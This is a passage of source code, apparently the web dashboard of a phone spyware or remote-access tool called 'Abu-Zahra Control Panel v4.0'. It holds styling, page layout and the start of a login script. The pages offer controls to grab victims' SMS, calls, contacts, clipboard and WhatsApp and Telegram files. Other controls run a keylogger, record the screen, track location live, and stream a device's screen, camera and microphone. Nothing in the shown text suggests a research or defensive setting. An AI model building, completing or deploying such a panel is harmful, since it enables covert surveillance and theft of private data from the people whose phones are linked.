.hamburger{display:none;position:fixed;top:12px;right:12px;z-index:150;background:var(--accent);color:#fff;border:none;width:42px;height:42px;border-radius:var(--radius-sm);font-size:20px;cursor:pointer;box-shadow:var(--shadow);transition:background var(--transition)}
.hamburger:hover{background:var(--accent-hover)}

/* ========== Main Content ========== */
.main{margin-right:var(--sidebar-width);padding:24px 28px;min-height:100vh;transition:margin var(--transition)}
.page{display:none;animation:fadeIn .25s ease}
.page.active{display:block}
@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}

/* ========== Topbar ========== */
.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.topbar h1{font-size:22px;font-weight:700;display:flex;align-items:center;gap:10px}
.topbar .time{color:var(--text-secondary);font-size:13px;font-variant-numeric:tabular-nums}
.live-indicator{display:inline-flex;align-items:center;gap:6px;background:var(--green-bg);color:var(--green);padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
.live-indicator .dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:livePulse 1.5s infinite}
.live-indicator.offline{background:var(--red-bg);color:var(--red)}
.live-indicator.offline .dot{background:var(--red);animation:none}
.live-indicator.connecting{background:var(--yellow-bg);color:var(--yellow)}
.live-indicator.connecting .dot{background:var(--yellow);animation:livePulse .8s infinite}
@keyframes livePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}

/* ========== Global Search ========== */
.global-search{position:relative;flex:1;max-width:360px;min-width:200px}
.global-search input{width:100%;padding:9px 14px 9px 36px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;outline:none;transition:border var(--transition)}
.global-search input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(88,166,255,.15)}
.global-search .search-icon{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--text-muted);font-size:14px;pointer-events:none}

/* ========== Stats Grid ========== */
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:24px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px 20px;transition:all var(--transition);position:relative;overflow:hidden}
.stat-card:hover{border-color:var(--border-light);transform:translateY(-1px);box-shadow:var(--shadow)}
.stat-card .stat-icon{width:40px;height:40px;border-radius:var(--radius-sm);display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:10px}
.stat-card .stat-icon.blue{background:var(--blue-bg);color:var(--blue)}
.stat-card .stat-icon.green{background:var(--green-bg);color:var(--green)}
.stat-card .stat-icon.yellow{background:var(--yellow-bg);color:var(--yellow)}
.stat-card .stat-icon.purple{background:var(--purple-bg);color:var(--purple)}
.stat-card .stat-icon.red{background:var(--red-bg);color:var(--red)}
.stat-card .stat-icon.orange{background:rgba(240,136,62,.12);color:var(--orange)}
.stat-card .label{color:var(--text-secondary);font-size:12px;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px;font-weight:500}
.stat-card .value{font-size:26px;font-weight:700;line-height:1.2}
.stat-card .sub{color:var(--text-muted);font-size:11px;margin-top:4px}

/* ========== Card ========== */
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px;transition:border var(--transition)}
.card:hover{border-color:var(--border-light)}
.card h3{margin-bottom:16px;font-size:15px;font-weight:600;display:flex;align-items:center;gap:8px;color:var(--text)}

/* ========== Filter Bar ========== */
.filter-bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
.filter-bar select,.filter-bar input{padding:7px 12px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:12px;outline:none;transition:border var(--transition)}
.filter-bar select:focus,.filter-bar input:focus{border-color:var(--blue)}
.filter-bar .filter-label{color:var(--text-muted);font-size:12px;white-space:nowrap}

/* ========== Table ========== */
.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;border-radius:var(--radius-sm);border:1px solid var(--border)}
table{width:100%;border-collapse:collapse;min-width:500px}
th,td{padding:10px 14px;text-align:right;border-bottom:1px solid var(--border);font-size:13px}
th{color:var(--text-secondary);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;background:var(--surface2);position:sticky;top:0}
tr:last-child td{border-bottom:none}
tr:hover td{background:var(--surface2)}

/* ========== Badges ========== */
.badge{display:inline-flex;align-items:center;padding:2px 9px;border-radius:12px;font-size:11px;font-weight:600;gap:4px;white-space:nowrap}
.badge-green{background:var(--green-bg);color:var(--green)}
.badge-red{background:var(--red-bg);color:var(--red)}
.badge-yellow{background:var(--yellow-bg);color:var(--yellow)}
.badge-blue{background:var(--blue-bg);color:var(--blue)}
.badge-purple{background:var(--purple-bg);color:var(--purple)}
.badge-orange{background:rgba(240,136,62,.12);color:var(--orange)}

/* ========== Buttons ========== */
.btn{padding:8px 16px;border:none;border-radius:var(--radius-sm);cursor:pointer;font-size:13px;transition:all var(--transition);display:inline-flex;align-items:center;gap:6px;font-weight:500}
.btn:active{transform:scale(.97)}
.btn-primary{background:var(--accent);color:#fff}
.btn-primary:hover{background:var(--accent-hover)}
.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
.btn-secondary:hover{background:var(--surface-hover);border-color:var(--border-light)}
.btn-sm{padding:5px 11px;font-size:12px}
.btn-danger{background:var(--red-bg);color:var(--red);border:1px solid rgba(248,81,73,.2)}
.btn-danger:hover{background:rgba(248,81,73,.2)}
.btn-ghost{background:transparent;color:var(--text-secondary);padding:4px 8px}
.btn-ghost:hover{color:var(--text);background:var(--surface2)}

/* ========== Command Grid ========== */
.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
.cmd-btn{padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:12px;transition:all var(--transition);text-align:right}
.cmd-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.08);transform:translateY(-1px)}
.cmd-btn:active{transform:translateY(0)}

/* ========== Device Cards ========== */
.device-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px;cursor:pointer;transition:all var(--transition);position:relative}
.device-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:var(--shadow)}
.device-card .dc-header{display:flex;align-items:center;gap:10px;margin-bottom:10px}
.device-card .dc-status{width:10px;height:10px;border-radius:50%;flex-shrink:0}
.device-card .dc-status.online{background:var(--green);box-shadow:0 0 8px rgba(63,185,80,.5);animation:statusGlow 2s infinite}
.device-card .dc-status.offline{background:var(--text-muted)}
@keyframes statusGlow{0%,100%{box-shadow:0 0 4px rgba(63,185,80,.3)}50%{box-shadow:0 0 12px rgba(63,185,80,.6)}}
.device-card .dc-name{font-size:15px;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.device-card .dc-model{color:var(--text-secondary);font-size:12px;margin-bottom:8px}
.device-card .dc-meta{display:flex;flex-wrap:wrap;gap:8px;font-size:11px;color:var(--text-muted)}
.device-card .dc-meta .meta-item{display:flex;align-items:center;gap:4px}
.device-card .dc-meta .meta-item .meta-icon{font-size:13px}
.device-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:14px}

/* Battery Bar */
.battery-bar{display:inline-flex;align-items:center;gap:4px}
.battery-bar .battery-shell{width:22px;height:11px;border:1.5px solid var(--text-muted);border-radius:3px;position:relative;overflow:hidden}
.battery-bar .battery-shell::after{content:'';position:absolute;right:-4px;top:2px;width:3px;height:5px;background:var(--text-muted);border-radius:0 1px 1px 0}
.battery-bar .battery-fill{height:100%;border-radius:1px;transition:width .3s}
.battery-fill.high{background:var(--green)}
.battery-fill.mid{background:var(--yellow)}
.battery-fill.low{background:var(--red)}
.battery-text{font-size:11px;font-weight:600;min-width:28px}

/* Signal Bars */
.signal-bars{display:inline-flex;align-items:flex-end;gap:1.5px;height:12px}
.signal-bars .bar{width:3px;border-radius:1px;background:var(--border-light);transition:background .3s}
.signal-bars .bar.active{background:var(--green)}
.signal-bars .bar:nth-child(1){height:3px}
.signal-bars .bar:nth-child(2){height:5px}
.signal-bars .bar:nth-child(3){height:8px}
.signal-bars .bar:nth-child(4){height:11px}

/* ========== Command Log ========== */
.command-log .cmd-item{padding:12px;border:1px solid var(--border);border-radius:var(--radius-sm);margin-bottom:8px;background:var(--bg);transition:all var(--transition)}
.command-log .cmd-item:hover{border-color:var(--border-light)}
.command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;gap:8px}
.command-log .cmd-item .cmd-cmd{font-family:'Cascadia Code',monospace;font-size:13px;font-weight:500}
.command-log .cmd-item .cmd-meta{color:var(--text-muted);font-size:11px;display:flex;gap:12px;flex-wrap:wrap}
.command-log .cmd-item .cmd-result{margin-top:8px;padding:10px;background:var(--surface2);border-radius:var(--radius-xs);font-size:12px;font-family:monospace;color:var(--text-secondary);max-height:200px;overflow-y:auto;word-break:break-all;white-space:pre-wrap;display:none;border:1px solid var(--border)}
.command-log .cmd-item .cmd-result.expanded{display:block}
.cmd-item .spinner{display:inline-block;width:12px;height:12px;border:2px solid var(--border);border-top-color:var(--yellow);border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* ========== Event Log ========== */
.event-log{max-height:600px;overflow-y:auto}
.event-item{display:grid;grid-template-columns:1fr auto auto auto;gap:8px;padding:10px 12px;border-bottom:1px solid var(--border);font-size:12px;align-items:center;transition:background var(--transition)}
.event-item:hover{background:var(--surface2)}
.event-item .ev-time{color:var(--text-muted);font-family:monospace;font-size:11px;white-space:nowrap}
.event-item .ev-device{color:var(--blue);font-weight:500}
.event-item .ev-type{padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600;text-transform:uppercase;white-space:nowrap}
.event-item .ev-type.security{background:var(--red-bg);color:var(--red)}
.event-item .ev-type.info{background:var(--blue-bg);color:var(--blue)}
.event-item .ev-type.warning{background:var(--yellow-bg);color:var(--yellow)}
.event-item .ev-type.success{background:var(--green-bg);color:var(--green)}
.event-item .ev-details{color:var(--text-secondary);grid-column:1/-1;font-size:11px}
.auto-scroll-bar{display:flex;align-items:center;gap:8px;margin-bottom:10px}
.auto-scroll-bar label{font-size:12px;color:var(--text-secondary);display:flex;align-items:center;gap:6px;cursor:pointer}
.auto-scroll-bar label input{accent-color:var(--accent)}

/* ========== Notification Toast ========== */
.notification{position:fixed;top:20px;left:20px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px 20px;z-index:300;transform:translateX(calc(-100% - 40px));transition:transform .3s cubic-bezier(.4,0,.2,1);font-size:14px;box-shadow:var(--shadow-lg);display:flex;align-items:center;gap:8px}
.notification.show{transform:translateX(0)}

/* ========== Modal ========== */
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
.modal-overlay.show{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:540px;max-width:90vw;max-height:80vh;overflow-y:auto;box-shadow:var(--shadow-lg)}

/* ========== Tabs ========== */
.tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
.tab{padding:7px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:transparent;color:var(--text-secondary);cursor:pointer;font-size:12px;transition:all var(--transition);font-weight:500}
.tab:hover{background:var(--surface2);color:var(--text)}
.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}

/* ========== Log Item (legacy) ========== */
.log-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;display:flex;gap:12px}
.log-item .time{color:var(--text-muted);white-space:nowrap;font-family:monospace}
.log-item .event{flex:1}

/* ========== Search Box ========== */
.search-box{display:flex;gap:8px;margin-bottom:16px}
.search-box input,.search-box select{flex:1;padding:9px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;outline:none;transition:border var(--transition)}
.search-box input:focus,.search-box select:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(88,166,255,.12)}

/* ========== Empty State ========== */
.empty{text-align:center;color:var(--text-muted);padding:40px 20px;font-size:14px}
.empty .empty-icon{font-size:40px;margin-bottom:10px;opacity:.5}

/* ========== Pulse ========== */
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}

/* ========== Streaming ========== */
.stream-layout{display:grid;grid-template-columns:320px 1fr;gap:16px;min-height:500px}
.stream-controls{display:flex;flex-direction:column;gap:12px}
.stream-viewer{position:relative;background:#000;border-radius:var(--radius);overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}
.stream-viewer video,.stream-viewer canvas,.stream-viewer img{width:100%;height:100%;object-fit:contain}
.stream-viewer .no-stream{color:var(--text-secondary);text-align:center;font-size:15px}
.stream-viewer .stream-badge{position:absolute;top:12px;left:12px;background:rgba(230,57,70,.9);color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px;backdrop-filter:blur(4px)}
.stream-viewer .stream-badge.live::before{content:'';width:8px;height:8px;background:#fff;border-radius:50%;animation:pulse 1s infinite}
.stream-type-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.stream-type-btn{padding:14px 8px;border-radius:10px;border:2px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all var(--transition);text-align:center}
.stream-type-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.05)}
.stream-type-btn.active{border-color:var(--accent);background:rgba(230,57,70,.12)}
.stream-type-btn .st-icon{font-size:28px;display:block;margin-bottom:4px}
.stream-actions{display:flex;gap:8px;flex-wrap:wrap}
.stream-actions .btn{flex:1;min-width:120px;justify-content:center;padding:12px}
.stream-info{padding:12px;background:var(--surface2);border-radius:var(--radius-sm);font-size:12px;color:var(--text-secondary)}
.stream-info div{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border)}
.stream-info div:last-child{border:none}
.stream-quality{display:flex;gap:6px;flex-wrap:wrap}
.stream-quality button{padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text-secondary);cursor:pointer;font-size:12px;transition:all var(--transition)}
.stream-quality button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
.audio-bars{display:flex;align-items:center;gap:3px;height:60px;padding:0 20px}
.audio-bars .bar{width:4px;background:var(--accent);border-radius:2px;transition:height .1s}

/* ========== Relative Time ========== */
.relative-time{color:var(--text-muted);font-size:11px}

/* ========== Responsive ========== */
@media(max-width:768px){
  .sidebar{transform:translateX(100%)}
  .sidebar.open{transform:translateX(0)}
  .sidebar-overlay.open{display:block}
  .main{margin-right:0;padding:16px;padding-top:64px}
  .hamburger{display:flex;align-items:center;justify-content:center}
  .stats-grid{grid-template-columns:repeat(2,1fr);gap:10px}
  .device-cards{grid-template-columns:1fr}
  .cmd-grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}
  .event-item{grid-template-columns:1fr;gap:4px}
  .event-item .ev-details{grid-column:auto}
  .global-search{max-width:100%;min-width:0}
  .stream-layout{grid-template-columns:1fr}
  .topbar h1{font-size:18px}
  .filter-bar{flex-direction:column;align-items:stretch}
  .filter-bar select,.filter-bar input{width:100%}
}
@media(max-width:480px){
  .stats-grid{grid-template-columns:1fr 1fr}
  .stat-card .value{font-size:20px}
  .stats-grid .stat-card{padding:14px 16px}
  .device-cards{grid-template-columns:1fr}
  .cmd-grid{grid-template-columns:1fr 1fr}
}
@media(min-width:1400px){
  .device-cards{grid-template-columns:repeat(auto-fill,minmax(320px,1fr))}
  .cmd-grid{grid-template-columns:repeat(auto-fill,minmax(220px,1fr))}
}
</style>
</head>
<body>

<!-- Login Page -->
<div class="login-page" id="loginPage">
<div class="login-box">
<h1>&#x1F7E5; Abu-Zahra</h1>
<p>Control Dashboard</p>
<input type="text" id="loginUser" placeholder="Username" value="admin">
<input type="password" id="loginPass" placeholder="Password">
<button onclick="doLogin()">Login</button>
<div class="login-error" id="loginError">Invalid credentials</div>
</div>
</div>

<!-- Hamburger -->
<button class="hamburger" id="hamburger" onclick="toggleSidebar()">&#9776;</button>

<!-- Sidebar Overlay (mobile) -->
<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>

<!-- App -->
<div class="app" id="app">
<nav class="sidebar" id="sidebar">
<div class="logo">
  <h2>&#x1F7E5; Abu-Zahra</h2>
  <span>Control Panel v4.0</span>
</div>
<nav>
<a class="active" data-page="dashboard" onclick="showPage('dashboard',this)">&#x1F4CA; Dashboard</a>
<a data-page="devices" onclick="showPage('devices',this)">&#x1F4F1; Devices</a>
<a data-page="commands" onclick="showPage('commands',this)">&#x1F3AE; Commands</a>
<a data-page="files" onclick="showPage('files',this)">&#x1F4C2; Files</a>
<a data-page="data" onclick="showPage('data',this)">&#x1F4E6; Data</a>
<a data-page="streaming" onclick="showPage('streaming',this)">&#x1F4E1; Live Stream</a>
<a data-page="monitor" onclick="showPage('monitor',this)">&#x1F50D; Monitor</a>
<a data-page="events" onclick="showPage('events',this)">&#x1F4CB; Events</a>
<a data-page="settings" onclick="showPage('settings',this)">&#x2699;&#xFE0F; Settings</a>
</nav>
<div class="sidebar-footer">
<a onclick="doLogout()" style="color:var(--red)">&#x1F6AA; Logout</a>
</div>
</nav>

<div class="main">

<!-- ====== Dashboard Page ====== -->
<div class="page active" id="page-dashboard">
<div class="topbar">
  <h1>&#x1F4CA; Dashboard</h1>
  <div style="display:flex;align-items:center;gap:12px">
    <div class="live-indicator" id="wsIndicator">
      <span class="dot"></span>
      <span id="wsStatusText">Connecting</span>
    </div>
    <span class="time" id="clock"></span>
  </div>
</div>
<div class="stats-grid" id="statsGrid"></div>
<div class="card"><h3>&#x1F4F1; Active Devices</h3><div id="dashDevices" class="device-cards"></div></div>
<div class="card"><h3>&#x1F4CB; Recent Commands</h3><div id="dashCommands" class="command-log"></div></div>
</div>

<!-- ====== Devices Page ====== -->
<div class="page" id="page-devices">
<div class="topbar">
  <h1>&#x1F4F1; Devices</h1>
  <button class="btn btn-primary" onclick="generateLink()">&#x1F517; Link Device</button>
</div>
<div class="global-search" style="max-width:100%;margin-bottom:16px">
  <span class="search-icon">&#x1F50D;</span>
  <input type="text" id="deviceSearch" placeholder="Search devices by name, model..." oninput="filterDevices()">
</div>
<div id="linkCodeBox" style="display:none" class="card">
  <h3>&#x1F517; Link Code</h3>
  <p id="linkCodeText" style="font-size:28px;font-weight:bold;text-align:center;color:var(--accent);letter-spacing:4px"></p>
</div>
<div class="filter-bar" id="deviceFilters">
  <span class="filter-label">Status:</span>
  <select id="deviceStatusFilter" onchange="filterDevices()">
    <option value="all">All</option>
    <option value="online">Online</option>
    <option value="offline">Offline</option>
  </select>
</div>
<div class="device-cards" id="deviceList"></div>
<div class="card" id="deviceDetail" style="display:none"></div>
</div>

<!-- ====== Commands Page ====== -->
<div class="page" id="page-commands">
<div class="topbar"><h1>&#x1F3AE; Command Center</h1></div>
<div class="card"><h3>Send Command</h3>
  <div class="search-box"><select id="cmdDevice" style="flex:1"></select></div>
  <div class="tabs" id="cmdTabs"></div>
  <div class="cmd-grid" id="cmdGrid"></div>
</div>
<div class="card">
  <h3>&#x1F4CB; Command Log</h3>
  <div class="filter-bar">
    <span class="filter-label">Filter:</span>
    <select id="cmdStatusFilter" onchange="filterCommandLog()">
      <option value="all">All Status</option>
      <option value="pending">Pending</option>
      <option value="completed">Completed</option>
      <option value="failed">Failed</option>
    </select>
    <input type="text" id="cmdSearchInput" placeholder="Search commands..." oninput="filterCommandLog()" style="max-width:200px">
  </div>
  <div id="cmdLog" class="command-log"></div>
</div>
</div>

<!-- ====== Files Page ====== -->
<div class="page" id="page-files">
<div class="topbar"><h1>&#x1F4C2; File Browser</h1></div>
<div class="card"><h3>Select device to browse files</h3>
<select id="fileDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text)"></select>
<div class="cmd-grid" style="margin-top:12px">
  <button class="cmd-btn" onclick="sendCmd('list_downloads')">&#x1F4E5; Downloads</button>
  <button class="cmd-btn" onclick="sendCmd('list_dcim')">&#x1F4F8; DCIM</button>
  <button class="cmd-btn" onclick="sendCmd('list_music')">&#x1F3B5; Music</button>
  <button class="cmd-btn" onclick="sendCmd('list_videos')">&#x1F3AC; Videos</button>
  <button class="cmd-btn" onclick="sendCmd('list_documents')">&#x1F4C1; Documents</button>
  <button class="cmd-btn" onclick="sendCmd('list_whatsapp')">&#x1F4AC; WhatsApp</button>
  <button class="cmd-btn" onclick="sendCmd('list_telegram_files')">&#x2708;&#xFE0F; Telegram</button>
  <button class="cmd-btn" onclick="sendCmd('recent_files')">&#x1F550; Recent</button>
</div></div>
</div>

<!-- ====== Data Page ====== -->
<div class="page" id="page-data">
<div class="topbar"><h1>&#x1F4E6; Data Viewer</h1></div>
<div class="card"><h3>Quick Data</h3>
<select id="dataDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
<div class="cmd-grid">
  <button class="cmd-btn" onclick="sendDataCmd('sms')">&#x1F4F2; SMS</button>
  <button class="cmd-btn" onclick="sendDataCmd('calls')">&#x1F4DE; Calls</button>
  <button class="cmd-btn" onclick="sendDataCmd('contacts')">&#x1F4C7; Contacts</button>
  <button class="cmd-btn" onclick="sendDataCmd('location')">&#x1F4CD; Location</button>
  <button class="cmd-btn" onclick="sendDataCmd('notifications')">&#x1F514; Notifications</button>
  <button class="cmd-btn" onclick="sendDataCmd('clipboard')">&#x1F4CB; Clipboard</button>
  <button class="cmd-btn" onclick="sendDataCmd('battery')">&#x1F50B; Battery</button>
  <button class="cmd-btn" onclick="sendDataCmd('info')">&#x2139;&#xFE0F; Device Info</button>
</div></div>
</div>

<!-- ====== Monitor Page ====== -->
<div class="page" id="page-monitor">
<div class="topbar"><h1>&#x1F50D; Monitoring</h1></div>
<div class="card"><h3>Monitor Controls</h3>
<select id="monDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
<div class="cmd-grid">
  <button class="cmd-btn" onclick="sendMonCmd('keylogger_start')">&#x2328;&#xFE0F; Start Keylogger</button>
  <button class="cmd-btn" onclick="sendMonCmd('keylogger_stop')">&#x23F9; Stop Keylogger</button>
  <button class="cmd-btn" onclick="sendMonCmd('get_keylogger')">&#x1F4E5; Get Keys</button>
  <button class="cmd-btn" onclick="sendMonCmd('screen_record_start')">&#x1F534; Start Screen Record</button>
  <button class="cmd-btn" onclick="sendMonCmd('screen_record_stop')">&#x23F9; Stop Screen Record</button>
  <button class="cmd-btn" onclick="sendMonCmd('location_live')">&#x1F5FA;&#xFE0F; Live Location</button>
  <button class="cmd-btn" onclick="sendMonCmd('location_stop')">&#x23F9; Stop Tracking</button>
  <button class="cmd-btn" onclick="sendMonCmd('location_history')">&#x1F4DC; Location History</button>
  <button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">&#x1F4F2; SMS Monitor</button>
  <button class="cmd-btn" onclick="sendMonCmd('call_monitor')">&#x1F4DE; Call Monitor</button>
</div></div>
</div>

<!-- ====== Events Page ====== -->
<div class="page" id="page-events">
<div class="topbar">
  <h1>&#x1F4CB; Event Log</h1>
  <button class="btn btn-secondary btn-sm" onclick="loadEvents()">&#x1F504; Refresh</button>
</div>
<div class="filter-bar">
  <span class="filter-label">Device:</span>
  <select id="eventDeviceFilter" onchange="filterEventLog()"><option value="all">All Devices</option></select>
  <span class="filter-label">Type:</span>
  <select id="eventTypeFilter" onchange="filterEventLog()">
    <option value="all">All Types</option>
    <option value="security">Security</option>
    <option value="info">Info</option>
    <option value="warning">Warning</option>
    <option value="success">Success</option>
  </select>
  <span class="filter-label">Date:</span>
  <input type="date" id="eventDateFilter" onchange="filterEventLog()" style="max-width:160px">
</div>
<div class="auto-scroll-bar">
  <label><input type="checkbox" id="eventAutoScroll" checked> Auto-scroll to latest</label>
</div>
<div class="table-wrap">
  <table>
    <thead><tr>
      <th>Time</th><th>Device</th><th>Type</th><th>Event</th><th>Details</th>
    </tr></thead>
    <tbody id="eventLogBody"></tbody>
  </table>
</div>
<div id="eventLogEmpty" class="empty" style="display:none">
  <div class="empty-icon">&#x1F4ED;</div>No events found
</div>
</div>

<!-- ====== Streaming Page ====== -->
<div class="page" id="page-streaming">
<div class="topbar"><h1>&#x1F4E1; Live Stream</h1></div>
<div class="stream-layout">
<div class="stream-controls">
  <div class="card" style="margin-bottom:0">
    <h3>Device</h3>
    <select id="streamDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:0" onchange="onStreamDeviceChange()"></select>
  </div>
  <div class="card" style="margin-bottom:0">
    <h3>Stream Type</h3>
    <div class="stream-type-grid">
      <button class="stream-type-btn active" id="stScreen" onclick="selectStreamType('screen')">
        <span class="st-icon">&#x1F5A5;&#xFE0F;</span>Screen
      </button>
      <button class="stream-type-btn" id="stCamera" onclick="selectStreamType('camera')">
        <span class="st-icon">&#x1F4F7;</span>Camera
      </button>
      <button class="stream-type-btn" id="stAudio" onclick="selectStreamType('audio')">
        <span class="st-icon">&#x1F399;&#xFE0F;</span>Audio
      </button>
    </div>
  </div>
  <div class="card" style="margin-bottom:0">
    <h3>Controls</h3>
    <div class="stream-actions">
      <button class="btn btn-primary" id="btnStartStream" onclick="startStream()">&#x25B6; Start Stream</button>
      <button class="btn btn-danger" id="btnStopStream" onclick="stopStream()" style="display:none">&#x23F9; Stop Stream</button>
      <button class="btn btn-secondary" id="btnSwitchCam" onclick="switchCamera()" style="display:none">&#x1F504; Switch Camera</button>
    </div>
  </div>
  <div class="card" style="margin-bottom:0" id="qualityCard">
    <h3>Quality</h3>
    <div class="stream-quality">
      <button class="active" onclick="setQuality('low',this)">SD</button>
      <button onclick="setQuality('medium',this)">HD</button>
      <button onclick="setQuality('high',this)">FHD</button>
    </div>
  </div>
  <div class="card" style="margin-bottom:0">
    <h3>Stream Info</h3>
    <div class="stream-info" id="streamInfoPanel">
      <div><span>Status</span><span id="stStatus">Stopped</span></div>
      <div><span>Type</span><span id="stType">-</span></div>
      <div><span>Device</span><span id="stDevice">-</span></div>
      <div><span>Frames</span><span id="stFrames">0</span></div>
      <div><span>Last Activity</span><span id="stLastAct">-</span></div>
    </div>
  </div>
</div>
<div>
  <div class="stream-viewer" id="streamViewer">
    <div class="no-stream" id="noStreamMsg">
      <div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>
      Select a device and start streaming
    </div>
    <img id="streamImg" style="display:none" alt="stream">
    <div class="stream-badge" id="streamBadge" style="display:none">LIVE</div>
  </div>
  <div id="audioPlayerContainer" style="display:none;margin-top:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
    <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
      <span style="font-size:20px">&#x1F399;&#xFE0F;</span>
      <span style="font-weight:600">Live Audio Stream</span>
      <span class="badge badge-green" id="audioLiveBadge">LIVE</span>
    </div>
    <div class="audio-bars" id="audioBars"></div>
    <audio id="streamAudio" autoplay style="width:100%;margin-top:8px"></audio>
  </div>
</div>
</div>
</div>

<!-- ====== Settings Page ====== -->
<div class="page" id="page-settings">
<div class="topbar"><h1>&#x2699;&#xFE0F; Settings</h1></div>
<div class="card"><h3>Server Settings</h3>
<div id="settingsForm"></div>
<button class="btn btn-primary" onclick="saveSettings()" style="margin-top:12px">&#x1F4BE; Save</button></div>
</div>

</div></div>

<div class="notification" id="notif"></div>

<script>
/* ========== Utilities ========== */
function esc(s){
  if(s==null)return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
function relativeTime(dateStr){
  if(!dateStr)return '';
  try{
    var d=new Date(dateStr);
    if(isNaN(d.getTime()))return dateStr;
    var now=Date.now();
    var diff=Math.floor((now-d.getTime())/1000);
    if(diff<0)diff=0;
    if(diff<10)return 'just now';
    if(diff<60)return diff+'s ago';
    if(diff<3600)return Math.floor(diff/60)+'m ago';
    if(diff<86400)return Math.floor(diff/3600)+'h ago';
    if(diff<604800)return Math.floor(diff/86400)+'d ago';
    return d.toLocaleDateString();
  }catch(e){return dateStr;}
}

/* ========== State ========== */
var TOKEN=localStorage.getItem('az_token')||'';
var POLL_INTERVAL=null;
var DEVICES=[];
var ALL_COMMANDS=[];
var ALL_EVENTS=[];
var PENDING_REFRESH=null;

/* ========== Notification ========== */
function notify(msg,color){
  color=color||'var(--green)';
  var n=document.getElementById('notif');
  n.innerHTML='<span style="color:'+color+';font-size:16px">&#x2713;</span> '+esc(msg);
  n.style.borderColor=color;
  n.classList.add('show');
  clearTimeout(n._t);
  n._t=setTimeout(function(){n.classList.remove('show');},3000);
}

/* ========== API ========== */
function api(path,opts){
  opts=opts||{};
  return fetch('/api/'+path,{
    headers:{'Content-Type':'application/json',...(TOKEN?{'Authorization':'Bearer '+TOKEN}:{})},
    ...opts
  }).then(function(r){return r.json();});
}

/* ========== Auth ========== */
async function doLogin(){
  var u=document.getElementById('loginUser').value;
  var p=document.getElementById('loginPass').value;
  var r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
  if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
  else{document.getElementById('loginError').style.display='block';}
}
function doLogout(){
  try{api('web/logout',{method:'POST'});}catch(e){}
